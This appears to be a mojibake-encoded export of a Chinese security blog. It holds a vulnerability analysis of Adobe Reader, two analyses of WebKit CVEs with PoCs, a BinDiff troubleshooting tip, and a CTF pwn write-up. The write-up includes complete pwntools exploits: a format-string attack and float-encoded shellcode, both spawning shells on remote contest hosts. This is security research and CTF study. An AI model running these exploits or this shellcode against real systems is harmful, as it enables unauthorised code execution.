AcroRd32!AX_PDXlateToHostEx+0x001ff9b5 57d3057c AcroRd32!AX_PDXlateToHostEx+0x001fff04 57f66e8e AcroRd32!AIDE::PixelPartInfo::operator=+0x0002e78e callstack å’Œ å †è¿½è¸ª å¾—åˆ°çš„ç»“æœ å‰éƒ¨åˆ†é‡åˆï¼Œå†…å­˜åœ¨ è¿™ä¸ªcallé‡Œåˆ†é…ï¼Œè¿™ä¸ªcallä¸€ç›´åˆ°æ ¸å¿ƒdllå†åˆ°ntdllå»åˆ†é…å†…å­˜ã€‚ åˆ†æçš„å‚æ•°æ¥æºå‘ç°ï¼š 123456789101112131415161718else if ( a3 == 2 ) { v17 = (*(int (__cdecl **)(_DWORD, void *))(dword_23A65354 + 0x60))(*v4, Src);// // // 0:000&gt; dd 4bc86fe8 // 4bc86fe8 000000cc 4f6d0f30 00000000 00000000 // 4bc86ff8 00000000 00000000 ???????? ???????? // 4bc87008 ???????? ???????? ???????? ???????? // 4bc87018 ???????? ???????? ???????? ???????? // 4bc87028 ???????? ???????? ???????? ???????? // 4bc87038 ???????? ???????? ???????? ???????? // 4bc87048 ???????? ???????? ???????? ???????? // 4bc87058 ???????? ???????? ???????? ???????? // // length str // // unicode str--&gt; ascii str } è¿™ä¸ªè°ƒç”¨å¯¹æ•°æ®ä½œå¤„ç†ï¼Œè¾“å…¥æ•°æ®ï¼š 1234567891011121314151617180:000&gt; dd 4f6d0f30 4f6d0f30 00ff00fe 00410041 00410041 004100414f6d0f40 00410041 00410041 00410041 004100414f6d0f50 00410041 00410041 00410041 004100414f6d0f60 00410041 00410041 00410041 004100414f6d0f70 00410041 00410041 00410041 004100414f6d0f80 00410041 00410041 00410041 004100414f6d0f90 00410041 00410041 00410041 004100414f6d0fa0 00410041 00410041 00410041 004100410:000&gt; dd 4f6d0f30 + 0xcc4f6d0ffc d0d00000 ???????? ???????? ????????4f6d100c ???????? ???????? ???????? ????????4f6d101c ???????? ???????? ???????? ????????4f6d102c ???????? ???????? ???????? ????????4f6d103c ???????? ???????? ???????? ????????4f6d104c ???????? ???????? ???????? ????????4f6d105c ???????? ???????? ???????? ????????4f6d106c ???????? ???????? ???????? ???????? å¾—åˆ°çš„ç»“æœæ˜¯: 12345678910110:000&gt; r eaxeax=4b9cef980:000&gt; dd eax4b9cef98 4141fffe 41414141 41414141 414141414b9cefa8 41414141 41414141 41414141 414141414b9cefb8 41414141 41414141 41414141 414141414b9cefc8 41414141 41414141 41414141 414141414b9cefd8 41414141 41414141 41414141 414141414b9cefe8 41414141 41414141 41414141 414141414b9ceff8 41414141 d0004141 ???????? ????????4b9cf008 ???????? ???????? ???????? ???????? ç„¶åç›´æ¥æŠŠè¿™ä¸ªbufferä¸ºå‚æ•°ä¼ é€’ç»™å¤„ç†å‡½æ•°ï¼ˆæ­¤æ—¶è¿™æ˜¯ä¸€ä¸ªascii string) 123456789101112131415160:000&gt; pBreakpoint 2 hiteax=4b9cef98 ebx=0098cec4 ecx=00000000 edx=7fffff99 esi=4b9cef98 edi=0098ce4ceip=529145bf esp=0098ce10 ebp=0098ce28 iopl=0 nv up ei pl nz na po nccs=0023 ss=002b ds=002b es=002b fs=0053 gs=002b efl=00000202EScript!PlugInMain+0x2b42:529145bf e8b1e5ffff call EScript!PlugInMain+0x10f8 (52912b75)0:000&gt; dd esi4b9cef98 4141fffe 41414141 41414141 414141414b9cefa8 41414141 41414141 41414141 414141414b9cefb8 41414141 41414141 41414141 414141414b9cefc8 41414141 41414141 41414141 414141414b9cefd8 41414141 41414141 41414141 414141414b9cefe8 41414141 41414141 41414141 414141414b9ceff8 41414141 d0004141 ???????? ????????4b9cf008 ???????? ???????? ???????? ???????? å¤„ç†å‡½æ•°åˆ¤æ–­æ˜¯ä¸æ˜¯unicodeï¼Œåªæ˜¯åˆ¤æ–­å‰ä¸¤ä¸ªå­—ç¬¦æ˜¯ä¸æ˜¯\\xFE\\xFFï¼Œå°±èµ°äº†unicodeé€»è¾‘ï¼Œæ‰€ä»¥å¯¼è‡´è¶Šç•Œè¯»ã€‚ 0x03 : what is root causeå…¶å®å°±æ˜¯ä¸Šå±‚ä¸€ç‚¹çš„é€»è¾‘å¯¹è¾“å…¥çš„å‚æ•°æ²¡åšè½¬æ¢(to unicode)ï¼Œå¯¼è‡´åé¢è·å–é•¿åº¦çš„å‡½æ•°å¤„ç†å­—ç¬¦ä¸²çš„æ—¶å€™ï¼Œè¯¯è®¤ä¸º\\xFE\\xFFå¼€å¤´çš„å°±æ˜¯unicodeå­—ç¬¦ä¸²ï¼Œç„¶åå°±è¶Šç•Œè¯»å–äº†ã€‚ 0x04 : ğŸ¤”å‡ ä¸ªæœˆå‰å†™çš„åˆ†æäº†ï¼Œå¯èƒ½ä¼šæœ‰é”™è¯¯ï¼Œæœ‰é—®é¢˜æ¬¢è¿å’Œæˆ‘æ²Ÿé€š : -) è¿™ä¸ªæ”»å‡»é¢å¯èƒ½å°±è¿™ä¹ˆä¸€ç‚¹ä¸€ç‚¹çš„æ¶ˆå¤±äº†å§ :-)","link":"/2019/08/14/Adobe-Acrobat-Reader-getUIPerms-setUIPerms-Unicode-String-Out-of-bound-Read/"},{"title":"Bindiff5.0 Could not create file handler fix","text":"0x00 : é—®é¢˜å‡çº§Mojaveå(è¿™äº‹å„¿Mojaveä¸èƒŒé”…)ï¼Œ bindiff5.0 å·¥ä½œä¸€ç›´æœ‰é—®é¢˜ï¼š Failed to initalize file logger. Could not create file handler ä»Šå¤©æ€»ç®—æå®šäº†è¿™ä¸ªé—®é¢˜ï¼Œè®°å½•ä¸€ä¸‹è¿‡ç¨‹ã€‚ 0x01 : å°è¯•è¿‡ç¨‹ é‡è£…ida å’Œ bindiffã€‚ âŒ Javaç¯å¢ƒé—®é¢˜ï¼Ÿ âŒ åæ¥å‘ç°æ˜¯æ—¥å¿—æ–‡ä»¶çš„é—®é¢˜ï¼Œæ­£å¸¸æƒ…å†µä¸‹ï¼Œä½ çš„æ—¥å¿—æ˜¯åœ¨: /Users/YOUR_USER_NAME/Library/Application Support/.bindiff æœ‰æ„æ€çš„æƒ…å†µæ˜¯ï¼Œå¦‚æœä½ ä¹‹å‰è£…è¿‡å…¶ä»–ç‰ˆæœ¬çš„bindiffï¼Œå¸è½½åè¿™ä¸ªç›®å½•å¹¶ä¸ä¼šè¢«åˆ é™¤ï¼Œè¿™å°±å¯¼è‡´äº†åé¢é«˜ç‰ˆæœ¬bindiffå‡ºç°ä¸€å¼€å§‹çš„é—®é¢˜ã€‚ç¬”è€…å°±æ˜¯ä¹‹å‰ç”¨ida6.8ï¼Œé…åˆbindiff4.3ï¼Œæ‰€ä»¥å‡ºç°äº†è¿™ä¸ªé—®é¢˜ã€‚ 0x02 : è§£å†³æ–¹æ¡ˆ1sudo rm -rf /Users/YOUR_USER_NAME/Library/Application Support/.bindiff é‡æ–°å®‰è£…bindiff5.0 é—®é¢˜è§£å†³ï¼happy diffï¼Œ happy bug huntingï¼","link":"/2019/08/22/Bindiff5-0-Could-not-create-file-handler-fix/"},{"title":"Baiuduæ¯ pwnä¸“åœºè®°å½•","text":"å‰è¨€åä¸€æœˆçš„ç¬¬ä¸€å‘¨ï¼Œç™¾åº¦æ¯çš„pwnä¸“åœºï¼Œå°±å»å­¦ä¹ äº†ä¸‹å§¿åŠ¿ï¼Œæ›´åŠ è®¤è¯†åˆ°è‡ªå·±çš„ä¸è¶³å’Œé—®é¢˜æ‰€åœ¨ï¼Œä»¥ååŠªåŠ›æ›´æ­£æ”¹è¿›~æœ¬æ¬¡æ¯”èµ›ä¸€å…±æ˜¯3ä¸ªmiscå’Œä¸‰ä¸ªpwnï¼Œé¢˜ç›®éƒ½ä¸éš¾ï¼Œpwnå¥½åƒæœ‰ä¸¤ä¸ªéƒ½æ˜¯åŸé¢˜ï¼Œä½†æ˜¯æˆ‘åªgoogleåˆ°äº†ç¬¬äºŒä¸ªé¢˜ç›®â€¦ 1.pwnmeæ ¼å¼åŒ–å­—ç¬¦ä¸²(x64) å…¶å®åé¢è¿˜æœ‰ä¸ªbofï¼Œfmtå’Œbofçš„ç»“åˆå¯èƒ½æ‰æ˜¯å‡ºé¢˜äººçš„æœ¬æ„å§(æˆ‘çŒœçš„)ã€‚ 12345678$ checksec pwnme [!] Couldn't find relocations against PLT to get symbols[*] '/home/muhe/Desktop/baidu-pwn1/pwnme' Arch: amd64-64-little RELRO: Full RELRO Stack: No canary found NX: NX enabled PIE: No PIE æ ¼å¼åŒ–å­—ç¬¦ä¸²åœ¨è¾“å‡ºnameå’Œpassçš„æ—¶å€™ä¼šå¯¼è‡´è¿™ä¸ªæ ¼å¼åŒ–å­—ç¬¦ä¸²ï¼Œå¯ä»¥ä»»æ„åœ°å€è¯»å†™ã€‚ ä½†æ˜¯éœ€è¦æ³¨æ„ x64ä¸­fmt æ³„éœ²çš„å‚æ•°çš„é¡ºåº( RDI-RDX-RCX-R8-R9-stack[0]-stack[1]......) å› ä¸ºæœ‰00æˆªæ–­ï¼Œæ‰€ä»¥è¦æ ¼å¼åŒ–çš„åœ°å€æ”¾åé¢( -ã€‚- æ²¡é”™ åå…¥å¼) æœ¬æ¥ä»¥ä¸ºå¼€äº† Full RELRO çš„æƒ…å†µä¸‹ DynELFå°±ä¸è¡Œäº†ï¼Œè¿˜æƒ³ç€æ‰‹åŠ¨å»è§£æå‡ºlibcåŸºåœ°å€ç„¶åå†æå‘¢â€¦æ”¹äº†ä¸‹æ–¹å¼å°±å¯ä»¥äº†ã€‚åœ¨å¸ˆå‚…çš„æŒ‡å¯¼ä¸‹å®Œæˆäº†leakçš„éƒ¨åˆ†ï¼Œç„¶åæ˜¯ä½¿ç”¨DynELFå»æ³„éœ²systemçš„åœ°å€ï¼Œåé¢æ”¹è¿”å›åœ°å€ä¸ºsystemï¼Œç„¶åè®¾ç½®å¥½å‚æ•°åï¼Œretè¿‡å»ã€‚ 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104# -*-coding:utf-8-*-from pwn import *# based on joker 's exploitr = remote(\"106.75.84.74\", 10001)#pwn#r = remote(\"127.0.0.1\", 10001)#pwn#context.log_level = \"debug\"read_got = 0x0000000000601FC8pop_rdi_ret = 0x0000000000400ed3pppr = 0x000000000400ECE#ret addr 0x0000000000400e56def leak(addr): r.recvuntil(\"&gt;\") r.sendline(\"2\") r.recvuntil(\"20):\") payload = \"aaaa\" r.sendline(payload) r.recvuntil(\"20):\") payload = \"%12$s\"+\"AAAAAAA\" + p64(addr) r.send(payload) r.recvuntil(\"&gt;\") r.sendline(\"1\") content = r.recvuntil(\"AAAAAAA\") if(len(content) == 12): print \"[*] NULL \" return '\\x00' else: print \"[*]%#x -- &gt; %s\" % (addr,(content[5:-7] or '').encode('hex')) return content[5:-7]#writebytedef writebyte(count_byte,addr): r.recvuntil(\"&gt;\") r.sendline(\"2\") r.recvuntil(\"20):\") payload = \"aaaa\" r.sendline(payload) r.recvuntil(\"20):\") payload = \"%{0}c%12$hhn\".format(count_byte) payload += \"A\"*(12-len(payload)) + p64(addr) r.send(payload) r.recvuntil(\"&gt;\") r.sendline(\"1\") r.recvuntil(\"\\n\")r.recvuntil(\"40):\")r.sendline(\"aaa\")r.recvuntil(\"40):\")r.sendline(\"aaa\")d = DynELF(leak,elf=ELF('./pwnme'))system_addr = d.lookup('system','libc')print \"[*] system addr:{0}\".format(hex(system_addr))#leak ret_addrr.recvuntil(\"&gt;\")r.sendline(\"2\")r.recvuntil(\"20):\")payload = \"aaaa\"r.sendline(payload)r.recvuntil(\"20):\")payload = \"%6$s\" #stackr.send(payload)r.recvuntil(\"&gt;\")r.sendline(\"1\")r.recvuntil(\"\\n\")content = r.recv(6)content = content.ljust(8,\"\\x00\")stack_addr = u64(content) # 0x7ffc23fb85e0stack_while_ret_addr = stack_addr + 8 - 0xb0 #print \"[*] stack_while_ret addr:{0}\".format(hex(stack_while_ret_addr))#leak_ret_addr'''0000| 0x7ffc23fb84f0 --&gt; 0x7ffc23fb8530 --&gt; 0x7ffc23fb85e0 --&gt; 0x400e70 (push r15)0008| 0x7ffc23fb84f8 --&gt; 0x400d32 (add rsp,0x30)0016| 0x7ffc23fb8500 --&gt; 0xa61616161 ('aaaa\\n')0024| 0x7ffc23fb8508 --&gt; 0x0 0032| 0x7ffc23fb8510 --&gt; 0x7324362500000000 ('')0040| 0x7ffc23fb8518 --&gt; 0x0 0048| 0x7ffc23fb8520 --&gt; 0x0 0056| 0x7ffc23fb8528 --&gt; 0x400d0b (cmp eax,0x2)'''writebyte(0xce,stack_while_ret_addr)writebyte(system_addr &amp; 0xff,stack_while_ret_addr + 0x30)writebyte((system_addr &gt;&gt; 8) &amp; 0xff,stack_while_ret_addr + 0x30 + 1)writebyte((system_addr &gt;&gt; 16) &amp; 0xff,stack_while_ret_addr + 0x30 + 2)writebyte((system_addr &gt;&gt; 24) &amp; 0xff,stack_while_ret_addr + 0x30 + 3)writebyte((system_addr &gt;&gt; 32) &amp; 0xff,stack_while_ret_addr + 0x30 + 4)writebyte((system_addr &gt;&gt; 40) &amp; 0xff,stack_while_ret_addr + 0x30 + 5)print r.recvuntil(\"&gt;\")r.sendline(\"2\")print r.recvuntil(\"20):\")payload = \"/bin/sh;\" + \"AAAAAAAABBB\"r.sendline(payload)print r.recvuntil(\"20):\")payload = \"\\x00\\x00\\x00\\x00\" + p64(pop_rdi_ret) + p64(stack_while_ret_addr + 8)#raw_input('$ret')r.send(payload)print r.recvuntil(\"&gt;\")r.sendline('3')r.interactive() 2.loadingç®€å•ç²—æš´æŠŠè¾“å…¥çš„æ¯ä¸ªå­—èŠ‚ /2333.0 ç„¶åç›´æ¥æ‰§è¡Œ æµ®ç‚¹æ•°çš„è€ƒå¯Ÿå•Šâ€¦googleäº†ä¸‹ float shellcodeï¼Œå°±æ‰¾åˆ°äº†åŸé¢˜å•Šâ€¦æŠŠåˆ«äººexpé‡Œçš„1337.0æ”¹æˆ2333.0å°±å¥½äº†â€¦æœåˆ°äº†pctf 2016 fixedpoint writeupè¿˜æœ‰è¿™ä¸ª PlaidCTF 2016 fixedpoint pctf è¿™ä¸ªçš„æºç ,ç®€ç›´ä¸è¦å†ä¸€æ ·å¥½ä¹ˆã€‚ 123456789101112131415161718#include &lt;stdlib.h&gt;#include &lt;sys/mman.h&gt;#include &lt;stdio.h&gt;int main(int argc, char** argv) { float* array = mmap(0, sizeof(float)*8192, 7, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0); int i; int temp; float ftemp; for (i = 0; i &lt; 8192; i++) { if (!scanf(\"%d\", &amp;temp)) break; array[i] = ((float)temp)/1337.0; } write(1, \"here we go\\n\", 11); (*(void(*)())array)();} é™„ä¸Šexploit 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950import structimport ctypesfrom pwn import *shellcode = [\"\\x31\\xc9\", # xor ecx, ecx \"\\xf7\\xe1\", # mul ecx \"\\x51\", # push ecx \"\\xb1\\xff\", # mov cl, 0xFF \"\\xb5\\xff\", # mov ch, 0xFF \"\\x41\", # inc ecx \"\\xb4\\x68\", # mov ah, 0x68 \"\\xb0\\x73\", # mov al, 0x73 \"\\xf7\\xe1\", # mul ecx \"\\xb4\\x2f\", # mov ah, 0x2F \"\\xb0\\x2f\", # mov al, 0x2F \"\\x50\", # push eax \"\\xb4\\x6e\", # mov ah, 0x6e \"\\xb0\\x69\", # mov al, 0x69 \"\\xf7\\xe1\", # mul ecx \"\\xb4\\x62\", # mov ah, 0x62 \"\\xb0\\x2f\", # mov al, 0x2F \"\\x50\", # push eax \"\\x31\\xc0\", # xor eax, eax \"\\x31\\xd2\", # xor edx, edx \"\\x31\\xc9\", # xor ecx, ecx \"\\x89\\xe3\", # mov ebx, esp \"\\xb0\\x0b\", # mov al, 11 \"\\xcd\\x80\"] # int 0x80ints_to_send = []for instr in shellcode: z = \"\\x40\" if len(instr) == 1: z = \"\\x90\\x40\" payload = \"\\x48\" + instr[::-1] + z a = struct.unpack(\"&gt;f\", payload)[0]*2333 if a &gt; 2147483647: log.error(\"It's too large fam.\") b = str(\"{0:f}\".format(a)).split(\".\")[0] log.info(b + \" \" + payload.encode(\"hex\")) ints_to_send.append(b)r = remote(\"106.75.84.68\", 20000)for i in ints_to_send: r.sendline(i)r.interactive() æ„Ÿè¨€è¿™ä¸ªæ¯”èµ›è®©æˆ‘æ„Ÿè§‰æ”¶è·æœ€å¤§çš„åº”è¯¥æ˜¯â€œæ€è€ƒâ€:è¦å­¦ä¼šè‡ªå·±æ€è€ƒï¼Œä¸ç„¶åšå†å¤šé¢˜ç›®éƒ½æ²¡æœ‰ç”¨ã€‚","link":"/2016/11/07/Baiudu%E6%9D%AF-pwn%E4%B8%93%E5%9C%BA%E8%AE%B0%E5%BD%95/"},{"title":"CVE-2017-2536 analysis","text":"0x00 : å‰ç½®çŸ¥è¯† interpreterè§£é‡Šå™¨ (LLint) DFG JITå…¨ç§° data flow graph JIT æ•°æ®æµå›¾ JITã€‚æ˜¯ä¸€ç§æ¨æµ‹ä¼˜åŒ–çš„æŠ€æœ¯ã€‚ä¼šå¼€å§‹å¯¹ä¸€ä¸ªç±»å‹åšå‡ºä¸€ä¸ªèƒ½å¤Ÿå¯¹æ€§èƒ½å¥½çš„å‡è®¾ï¼Œå…ˆç¼–è¯‘ä¸€ä¸ªç‰ˆæœ¬ï¼Œå¦‚æœåé¢å‘ç°å‡è®¾ä¸å¯¹å°±ä¼šè·³è½¬å›åŸå…ˆä»£ç ï¼Œç§°ä¸º Speculation failureã€‚DFG æ˜¯å¹¶å‘ç¼–è¯‘å™¨ï¼ŒDFG pipeline çš„æ¯ä¸ªéƒ¨åˆ†éƒ½æ˜¯åŒæ—¶è¿è¡Œçš„ï¼ŒåŒ…æ‹¬å­—èŠ‚ç è§£æå’Œåˆ†æã€‚ FLT JITæ–°çš„ä¸€å±‚ FTL å®é™…ä¸Šæ˜¯ DFG Backend çš„æ›¿æ¢ã€‚ä¼šå…ˆåœ¨ DFG çš„ JavaScript å‡½æ•°è¡¨ç¤ºè½¬æ¢ä¸ºé™æ€å•ä¸€æŒ‡æ´¾ï¼ˆSSAï¼‰ æ ¼å¼ä¸Šåšäº› JavaScript ç‰¹æ€§çš„ä¼˜åŒ–ã€‚æ¥ç€æŠŠ DFG IR è½¬æ¢æˆ FTL é‡Œç”¨åˆ°çš„ B3 çš„ IRã€‚æœ€åç”Ÿæˆæœºå™¨ç ã€‚ æ€»çš„æ¥è¯´è¿‡ç¨‹å°±æ˜¯æŠŠæºç ç”Ÿæˆå­—èŠ‚ç ï¼Œæ¥ç€å˜æˆ DFG CPS IRï¼Œå†å°±æ˜¯ DFG SSA IRï¼Œæœ€åæˆ B3 çš„ IRï¼ŒJavaScript çš„åŠ¨æ€æ€§å°±æ˜¯åœ¨è¿™äº›è¿‡ç¨‹ä¸­ä¸€æ­¥æ­¥è¢«æ¶ˆé™¤æ‰çš„ã€‚ é¦–å…ˆäº†è§£ javascriptå±•å¼€è¯­æ³•: 1234ES6çš„æ–°ç‰¹æ€§: å±•å¼€è¯­æ³•(Spread syntax), å¯ä»¥åœ¨å‡½æ•°è°ƒç”¨/æ•°ç»„æ„é€ æ—¶, å°†æ•°ç»„è¡¨è¾¾å¼æˆ–è€…stringåœ¨è¯­æ³•å±‚é¢å±•å¼€ï¼› è¿˜å¯ä»¥åœ¨æ„é€ å­—é¢é‡å¯¹è±¡æ—¶, å°†å¯¹è±¡è¡¨è¾¾å¼æŒ‰key-valueçš„æ–¹å¼å±•å¼€ã€‚ (è¯‘è€…æ³¨: å­—é¢é‡ä¸€èˆ¬æŒ‡ [1, 2, 3] æˆ–è€… {name: &quot;mdn&quot;} è¿™ç§ç®€æ´çš„æ„é€ æ–¹å¼) 123var a = [1, 2, 3];console.log(...a);// 1 2 3 0x01 : æ¼æ´ä¿¡æ¯ç»å…¸çš„jitæ´ git commit : 61dbb71d92f6a9e5a72c5f784eb5ed11495b3ff7 12let a = new Array(0x7fffffff);let hax = [13, 37, ...a, ...a]; PoCä¸­ï¼Œhaxæ•°ç»„çš„é•¿åº¦ï¼Œéœ€è¦è®¡ç®—ï¼Œæ ¹æ®å±•å¼€array aå»è®¡ç®—ï¼Œjitä¸­è¿™éƒ¨åˆ†å®ç°å‡ºäº†é—®é¢˜ã€‚ 0x02 : æ¼æ´åˆ†æExploiting an integer overflow with array spreading (WebKit) 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748SLOW_PATH_DECL(slow_path_new_array_with_spread){ BEGIN(); int numItems = pc[3].u.operand; ASSERT(numItems &gt;= 0); const BitVector&amp; bitVector = exec-&gt;codeBlock()-&gt;unlinkedCodeBlock()-&gt;bitVector(pc[4].u.unsignedValue); JSValue* values = bitwise_cast&lt;JSValue*&gt;(&amp;OP(2)); // è®¡ç®—array size // poc ä¸­çš„ hax array unsigned arraySize = 0; for (int i = 0; i &lt; numItems; i++) { if (bitVector.get(i)) { JSValue value = values[-i]; JSFixedArray* array = jsCast&lt;JSFixedArray*&gt;(value); arraySize += array-&gt;size(); } else arraySize += 1; } JSGlobalObject* globalObject = exec-&gt;lexicalGlobalObject(); Structure* structure = globalObject-&gt;arrayStructureForIndexingTypeDuringAllocation(ArrayWithContiguous); JSArray* result = JSArray::tryCreateForInitializationPrivate(vm, structure, arraySize); CHECK_EXCEPTION(); // æ ¹æ®è®¡ç®—çš„sizeï¼Œåˆ†é…ç©ºé—´ unsigned index = 0; for (int i = 0; i &lt; numItems; i++) { JSValue value = values[-i]; if (bitVector.get(i)) { // We are spreading. JSFixedArray* array = jsCast&lt;JSFixedArray*&gt;(value); for (unsigned i = 0; i &lt; array-&gt;size(); i++) { RELEASE_ASSERT(array-&gt;get(i)); result-&gt;initializeIndex(vm, index, array-&gt;get(i)); ++index; } } else { // We are not spreading. result-&gt;initializeIndex(vm, index, value); ++index; } } RETURN(result);} size æ˜¯ä¸€ä¸ª unsigned ï¼Œå¯ä»¥æ•´æ•°æº¢å‡ºã€‚JSObject::initializeIndexæ— ä»»ä½•è¾¹ç•Œæ£€æŸ¥ï¼š 12345678910/* ... */case ALL_CONTIGUOUS_INDEXING_TYPES: { ASSERT(i &lt; butterfly-&gt;publicLength()); ASSERT(i &lt; butterfly-&gt;vectorLength()); butterfly-&gt;contiguous()[i].set(vm, this, v); break;}/* ... */ æ‰€ä»¥pocæŒ‰ç…§ä»¥ä¸Šä»£ç é€»è¾‘ä¹‹è¡Œçš„è¯ï¼Œä¼šåˆ†é…ä¸€ä¸ªsizeæ˜¯0çš„arrayï¼Œä½†æ˜¯å´æ‹·è´äº† 2147483647 * 2 + 2 å³ 0x7fffffff * 2 + 2 ä¸ªæ•°æ®è¿›å»ï¼Œå¯¼è‡´å †æº¢å‡ºã€‚ çœ‹commit1git log -g --grep=&quot;169780&quot; æˆ–è€…ç›´æ¥sourcetreeæœç´¢ è¿™ä¸ªæ´åœ¨ä¸‰ä¸ªjité˜¶æ®µéƒ½æœ‰ä½“ç°ï¼Œæ‰€ä»¥è¡¥äº†å¤šä¸ªåœ°æ–¹ï¼šLLint, DFG JIT, FTL JIT åŸºæœ¬ä¸Šéƒ½æ˜¯ï¼Œè®¡ç®—æ–°arrayçš„lengthä»ç®€å•ç²—æš´çš„è®¡ç®—ï¼Œæ”¹æˆå¢åŠ äº†length checkçš„è®¡ç®—ã€‚ 0x03 : åˆ©ç”¨ TODO 0x04 : å‚è€ƒExploiting an integer overflow with array spreading (WebKit) æ·±å…¥å‰–æ WebKit","link":"/2019/03/24/CVE-2017-2536-analysis/"},{"title":"CVE-2016-4622  analysis","text":"0x00 : Vuln infoVuln : Out-Of-Bound ReadWebkit Version : 320b1fcSource Code : ArrayPrototype.cpp çš„sliceéƒ¨åˆ†é€»è¾‘ 1git checkout -b CVE-2016-4662 320b1fc 0x01 : PoC123456var a = [];for (var i = 0; i &lt; 100; i++) a.push(i + 0.123);var b = a.slice(0, {valueOf: function() { a.length = 0; return 10; }});// b = [0.123,1.123,2.12199579146e-313,0,0,0,0,0,0,0] 0x02 : AnalysisPoC åˆ†æ123456var a = [];for (var i = 0; i &lt; 100; i++) a.push(i + 0.123);var b = a.slice(0, {valueOf: function() { a.length = 0; return 10; }});// b = [0.123,1.123,2.12199579146e-313,0,0,0,0,0,0,0] åŸæœ¬æƒ³è¦åšçš„æ˜¯ï¼šä»a arrayä¸­å–å‰åä¸ªå…ƒç´ ï¼Œæ”¾å…¥b arrayä¸­ã€‚ æ¼æ´æˆå› sliceå¯¹åº”åˆ†ç‰‡æ“ä½œï¼Œè¿™é‡Œbæ•°ç»„çš„å€¼æ˜¯å–çš„aæ•°ç»„çš„å‰åä¸ªå…ƒç´ ï¼Œä½†æ˜¯è¿™é‡Œå–çš„æ—¶å€™ï¼ŒvalueOfè¿™ä¸ªå›è°ƒä¿®æ”¹æ‰äº†aæ•°ç»„çš„é•¿åº¦ï¼›ç„¶è€Œï¼Œåœ¨å‘ç”Ÿæ‹·è´æ“ä½œçš„æ—¶å€™ï¼Œsliceçš„å®ç°å‡½æ•°å¹¶æ²¡æœ‰æ£€æŸ¥é•¿åº¦ï¼Œå°±ç›´æ¥æ‹·è´äº†æ•°æ®ï¼Œè¿™å°±å¯¼è‡´bæ•°ç»„å–çš„æ—¶å€™è®¿é—®åˆ°äº†aæ•°ç»„ä»¥å¤–çš„å†…å­˜ï¼Œæ‰€ä»¥å¯ä»¥çœ‹åˆ°bæ•°ç»„çš„å†…å®¹æ˜¯ï¼š[0.123,1.123,2.12199579146e-313,0,0,0,0,0,0,0]ä»0.123ä¹‹åéƒ½æ˜¯å…¶ä»–æ•°æ®ï¼Œæ­¤æ—¶å·²ç»å‘ç”Ÿäº†è¶Šç•Œè¯»ã€‚ root cause : æ‹·è´å‰æœªåšé•¿åº¦æ£€æŸ¥ æœªpatchçš„ä»£ç å¦‚ä¸‹ï¼š 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748EncodedJSValue JSC_HOST_CALL arrayProtoFuncSlice(ExecState* exec){ JSObject* thisObj = exec-&gt;thisValue() .toThis(exec, StrictMode) .toObject(exec); if (!thisObj) return JSValue::encode(JSValue()); unsigned length = getLength(exec, thisObj); if (exec-&gt;hadException()) return JSValue::encode(jsUndefined()); unsigned begin = argumentClampedIndexFromStartOrEnd(exec, 0, length); unsigned end = argumentClampedIndexFromStartOrEnd(exec, 1, length, length); std::pair&lt;SpeciesConstructResult, JSObject*&gt; speciesResult = speciesConstructArray(exec, thisObj, end - begin); if (UNLIKELY(speciesResult.first == SpeciesConstructResult::Exception)) return JSValue::encode(jsUndefined());// æ‰§è¡Œåˆ‡ç‰‡æ“ä½œï¼Œä½†æ˜¯æ²¡æœ‰ä»»ä½•æ£€æŸ¥ if (LIKELY(speciesResult.first == SpeciesConstructResult::FastPath &amp;&amp; isJSArray(thisObj))) { if (JSArray* result = asArray(thisObj)-&gt;fastSlice(*exec, begin, end - begin)) return JSValue::encode(result); } JSObject* result; if (speciesResult.first == SpeciesConstructResult::CreatedObject) result = speciesResult.second; else result = constructEmptyArray(exec, nullptr, end - begin); unsigned n = 0; for (unsigned k = begin; k &lt; end; k++, n++) { JSValue v = getProperty(exec, thisObj, k); if (exec-&gt;hadException()) return JSValue::encode(jsUndefined()); if (v) result-&gt;putDirectIndex(exec, n, v); } setLength(exec, result, n); return JSValue::encode(result);} 0x03 : Exploitè¿™é‡Œä¸å†èµ˜è¿°ï¼ŒåŸæ–‡ä½œè€…å†™çš„å¾ˆè¯¦ç»†ï¼Œæˆ‘ä¹Ÿæ˜¯è·Ÿç€ä»–çš„æ–‡ç« è°ƒè¯•å­¦ä¹ çš„ã€‚ åˆ©ç”¨æ€è·¯ï¼š ä¿¡æ¯æ³„æ¼ ä¼ªé€ å¯¹è±¡(Fload64Array) ä»»æ„åœ°å€è¯»å†™ è¯»å–ä¸€ä¸ªfunction objçš„åœ°å€ï¼Œè§¦å‘JITç”ŸæˆRWXçš„ä»£ç  åˆ©ç”¨ä»»æ„åœ°å€è¯»å†™å†™å…¥shellcode æ‰§è¡Œfunction 0x04: åç»­1. how to find this bugï¼Ÿâ€‹ ä»£ç å®¡è®¡å°±ä¸è¯´äº†ï¼Œä¸»è¦æ˜¯å…³æ³¨åœ¨ä¸€äº›æ•æ„Ÿå‡½æ•°å‰åçš„checkæƒ…å†µï¼Œæ¯”å¦‚å¤åˆ¶æ“ä½œï¼Œæ‹¼æ¥æ“ä½œç­‰ã€‚ â€‹ Fuzzçš„è¯ï¼Œç”Ÿæˆå¼å’Œå˜å¼‚å¼éƒ½å¾ˆå®¹æ˜“è¦†ç›–åˆ°è¿™ä¸ªcaseï¼Œå¹¶æ²¡æœ‰å¾ˆéš¾ï¼Œåªæ˜¯è¿™ä¸ªæ´æ˜¯ä¸€ç§æ¨¡å¼çš„é—®é¢˜ï¼Œæ‰€ä»¥åœ¨å†™fuzzçš„è§„åˆ™æˆ–è€…æ¨¡ç‰ˆçš„æ—¶å€™è¦å¤šæ³¨æ„ã€‚æ‰€ä»¥åœ¨çœ‹æ´çš„æ—¶å€™è¦æ€è€ƒï¼Œè¿™æ˜¯ä¸€ä¸ªæ¨¡å¼çš„é—®é¢˜ï¼Œè¿˜æ˜¯ä¸ªä¾‹ã€‚ 2. å…¶ä»–ç±»ä¼¼çš„bugâ€‹ 